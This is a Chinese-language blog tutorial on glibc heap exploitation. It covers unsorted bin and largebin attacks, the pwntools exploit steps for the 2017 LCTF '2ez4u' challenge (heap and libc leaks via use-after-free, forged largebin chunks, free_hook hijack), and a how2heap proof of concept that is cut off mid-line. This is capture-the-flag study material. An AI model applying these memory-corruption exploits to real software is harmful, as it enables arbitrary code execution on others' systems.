<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;h3 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;说到向任意地址上写一个较大的数值，下意识绝对会想到unsorted bin attack，在一些较低版本的题目中unsorted bin attack是奏效的，但是在glibc-2.29之后，增加了一些保护unsorted bin attack这种利用方法基本">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>libc_heap(3) | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/03/22/heap3/">libc_heap(3)</a></h1>
  <aside>
    
    <time datetime="222022-03-22">
      March 22nd 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/study/">study</a></li>
    
    </ul>
  </aside>
</header>

  <div><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说到向任意地址上写一个较大的数值，下意识绝对会想到unsorted bin attack，在一些较低版本的题目中unsorted bin attack是奏效的，但是在glibc-2.29之后，增加了一些保护unsorted bin attack这种利用方法基本上是不能用了。不过可以找到替代的利用方法。就像上一篇文章我们所讲到的Tcache Stashing Unlink Attack，可以实现向任意指定位置写入可控的值。而有一个新的利用方法largebin attack可以任意地址写一个堆地址，这样来看的话不需要leak_heap_addr就可以将可控制堆块的地址写入目标地址。</p>
<h3 id="缅怀过去"><a href="#缅怀过去" class="headerlink" title="缅怀过去"></a>缅怀过去</h3><p>感谢unsorted bin attack在glibc-2.29之前为pwn做出的贡献。</p>
<p>还是要简单的说一下unsorted bin attack的利用原理的：Unsorted Bin在使用过程中，采用的遍历顺序是FIFO（先进先出），即挂进链表的时候依次从Unsorted bin的头部向尾部挂，取的时候是从尾部向头部取。在程序malloc时，如果fast bin、small bin中找不到对应大小的chunk，就会尝试从Unsorted bin中寻找chunk。如果取出来的chunk的size刚好满足，则直接交给用户，否则就会把这些chunk分别插入到对应的bin中。结合源码来看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* remove <span class="keyword">from</span> unsorted <span class="built_in">list</span> */</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>unsortedbin的bk指针指向的是后一个释放的堆块地址，那么如果我们能够控制unsortedbin的bk指针指向一个可写的地址内，就可以向其地址写上一个unsorted bin的地址。</p>
<h3 id="关于largebin-attack的过去"><a href="#关于largebin-attack的过去" class="headerlink" title="关于largebin attack的过去"></a>关于largebin attack的过去</h3><p>关于在glibc-2.29之前的largebin attack，是在申请largebin的过程中，伪造largebin的bk_nextsize，实现非预期内存申请。这种利用的关键在于伪造一个largebin chunk，然后将fake chunk申请出来。</p>
<p>largebin的分配源码是这样的：</p>
<p>可以看到largebin中并不是像其他bin一样存放的都是大小相同的chunk，在largebin中存储的是大小不同的chunk，所以这就应声而出了两个largebin chunk特有的两个字段——fd_nextsize和bk_nextsize。largebin中的chunk按照大小排序，fd_nextsize指向下一个比当前chunk大小小的第一个空闲块，bk_nextsize指向前一个比当前chunk大小大的第一个空闲chunk，这样的结构有利于程序更好的遍历largebin中的堆块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;  <span class="comment">//获取链表的第一个chunk</span></span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;  <span class="comment">//反向遍历，chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//large bin的unlink操作</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="实例-2017lctf-2ez4u"><a href="#实例-2017lctf-2ez4u" class="headerlink" title="实例-2017lctf-2ez4u"></a>实例-2017lctf-2ez4u</h4><p>我们主要是了解largebin attack的利用，题目的逆向部分我们简单描述一下：程序保护全开，经典的菜单题目，增查删改一应俱全，free函数里面存在uaf漏洞，在free堆块之后没有将堆块指针清零。</p>
<h5 id="leak-heap-addr"><a href="#leak-heap-addr" class="headerlink" title="leak_heap_addr"></a>leak_heap_addr</h5><p>通过释放两个largebin大小的堆块，使他们构成一条largebin的链子，这样的话chunk中的fd_nextsize与bk_nextsize会被赋值，再利用UAF打印即可得到堆块地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;0&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;1&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;2&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;3&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;4&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;5&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;6&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">&#x27;7&#x27;</span>*<span class="number">0x3f0</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">&#x27;8&#x27;</span>*<span class="number">0x30</span> ) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">&#x27;9&#x27;</span>*<span class="number">0x3d0</span>) <span class="comment"># 9 </span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> ) <span class="comment"># a</span></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x3e0</span>) <span class="comment"># b </span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">&#x27;c&#x27;</span>*<span class="number">0x30</span> ) <span class="comment"># c</span></span><br><span class="line">dele(<span class="number">0x9</span>)  <span class="comment">##释放第一个大块</span></span><br><span class="line">dele(<span class="number">0xb</span>)  <span class="comment">##释放第二个大块</span></span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;0&#x27;</span>*<span class="number">0x400</span>)  <span class="comment">#申请一个较大的块，使得unsorted bin数组清空</span></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)  <span class="comment">##泄露得到堆地址</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;num: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c_uint32(<span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>])).value)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;description:&#x27;</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:-<span class="number">1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x7e0</span></span><br><span class="line">log.info(<span class="string">&quot;heap base 0x%016x&quot;</span> % HEAP)</span><br></pre></td></tr></table></figure>

<h5 id="伪造largebin-chunk"><a href="#伪造largebin-chunk" class="headerlink" title="伪造largebin chunk"></a>伪造largebin chunk</h5><p>在上一步泄露了heap地址，剩下的前期任务就是要泄露libc。使用的方法就是利用的伪造largebin chunk。不需要将伪造的堆块释放，修改之前被释放堆块的bk_nextsize字段即可，对应到源代码中代码即<code>victim = victim-&gt;bk_nextsize</code>，这一点使用UAF即可做到，但想要将该堆块申请出来，还需要绕过unlink的限制，这也可以通过UAF实现。在可以将伪造的堆块申请出来之后，我们可以在伪造的堆块中包含有正常的small bin，这样就可以达到泄露出libc地址以及修改内存的目的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim  ##修改victim = victim-&gt;bk_nextsize，伪造堆块开始</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target ##这一步是为了绕过unlink的fd与bk检查</span></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)  <span class="comment">##这一步是为了绕过fd_nextsize与bk_nextsize检查</span></span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line">chunk1  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr-<span class="number">0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr-<span class="number">0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)  <span class="comment">##伪造的堆块</span></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">&#x27;7&#x27;</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))  <span class="comment">##伪造的堆块后加上结构体。</span></span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">&#x27;3&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!! ##将伪造的堆块申请出来，从此便可为所欲为。。。</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">&#x27;6&#x27;</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">show(<span class="number">0x3</span>) <span class="comment">##伪造的堆块中包含small bin，泄露libc地址</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;3&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3c4be8</span></span><br><span class="line">log.info(<span class="string">&quot;libc base 0x%016x&quot;</span> % LIBC)</span><br></pre></td></tr></table></figure>

<p>剩下的就是简单的利用uaf和fastbin attack hijack free_hook为system。</p>
<h3 id="关于如今的largebin-attack"><a href="#关于如今的largebin-attack" class="headerlink" title="关于如今的largebin attack"></a>关于如今的largebin attack</h3><p>在新出的glibc版本中如2.31（目前比赛主流的版本）增加了两个检查使得之前的largebin attack没有办法使用惹</p>
<p>检查一</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>检查二</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="凡是需要找个实例"><a href="#凡是需要找个实例" class="headerlink" title="凡是需要找个实例"></a>凡是需要找个实例</h4><p>这次还是找到了how2heap的largebin_attack.c</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220402221416-g73iztk.png" alt="image.png"></p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;assert.h&gt;</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">A revisit to large <span class="built_in">bin</span> attack <span class="keyword">for</span> after glibc2<span class="number">.30</span></span><br><span class="line"></span><br><span class="line">Relevant code snippet :</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">		fwd = bck;</span><br><span class="line">		bck = bck-&gt;bk;</span><br><span class="line">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">  /*Disable IO buffering to prevent stream <span class="keyword">from</span> interfering <span class="keyword">with</span> heap*/</span><br><span class="line">  setvbuf(stdin,NULL,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout,NULL,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(stderr,NULL,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  printf(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  size_t target = <span class="number">0</span>;</span><br><span class="line">  printf(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  size_t *p1 = malloc(<span class="number">0x428</span>);</span><br><span class="line">  printf(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1-<span class="number">2</span>);</span><br><span class="line">  size_t *g1 = malloc(<span class="number">0x18</span>);</span><br><span class="line">  printf(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  size_t *p2 = malloc(<span class="number">0x418</span>);</span><br><span class="line">  printf(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2-<span class="number">2</span>);</span><br><span class="line">  printf(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  size_t *g2 = malloc(<span class="number">0x18</span>);</span><br><span class="line">  printf(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  free(p1);</span><br><span class="line">  printf(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1-<span class="number">2</span>);</span><br><span class="line">  size_t *g3 = malloc(<span class="number">0x438</span>);</span><br><span class="line">  printf(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  free(p2);</span><br><span class="line">  printf(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2-<span class="number">2</span>);</span><br><span class="line">  printf(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1-<span class="number">2</span>);</span><br><span class="line">  printf(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2-<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (size_t)((&amp;target)-<span class="number">4</span>);</span><br><span class="line">  printf(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)-<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  size_t *g4 = malloc(<span class="number">0x438</span>);</span><br><span class="line">  printf(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2-<span class="number">2</span>, p2-<span class="number">2</span>);</span><br><span class="line">  printf(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2-<span class="number">2</span>, p1-<span class="number">2</span>, p2-<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2-<span class="number">2</span>, (void 